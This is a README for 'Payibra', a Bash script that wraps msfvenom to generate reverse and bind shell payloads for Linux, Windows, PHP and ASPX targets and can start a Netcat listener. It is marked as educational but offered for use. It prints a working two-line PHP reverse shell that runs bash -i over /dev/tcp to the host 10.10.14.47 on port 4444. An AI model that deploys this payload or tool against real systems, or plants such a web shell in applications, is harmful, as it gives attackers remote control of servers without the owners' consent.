# PAYIBRA - Bash Payload Generator

****THIS TOOL IS FOR EDUCATIONAL USE ONLY ****

Author: Ibrahim


**Payibra** is a custom Bash script that helps you create different types of payloads using `msfvenom`. It supports Linux, Windows, PHP, and ASPX targets, and gives you options to set your IP, port, payload type, and more.

You can also choose between a full PHP meterpreter shell or a lightweight 2-line PHP reverse shell for fast use.

---

## Features

- Easy-to-use terminal interface
- Supports reverse and bind shell payloads
- Compatible with Linux, Windows, PHP, and ASPX
- Option to generate a small PHP shell (2 lines only)
- Optional automatic Netcat listener after payload creation
- Clean output and color formatting

---

## Requirements

Before using the script, make sure you have:

- A Linux environment (or WSL)
- Bash
- `msfvenom` (included with Metasploit)
- `figlet` (for the banner)

Install any missing tools:

```bash
sudo apt update
sudo apt install metasploit-framework figlet


Installation

Clone the tool and make it executable:

git clone https://github.com/YOUR-USERNAME/payibra.git
cd payibra
chmod +x payibra.sh

Usage

Run the script:

./payibra.sh

You'll be asked to choose:

    The target system (e.g. linux, windows, php)

    Payload type (reverse or bind)

    LHOST and LPORT

    Output filename

    Optional encoder and iterations

    For PHP: choose between full shell or simple 2-line version

Example of the simple PHP shell it can generate:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.47/4444 0>&1'"); ?>

After the payload is created, you’ll be asked if you want to start a Netcat listener.
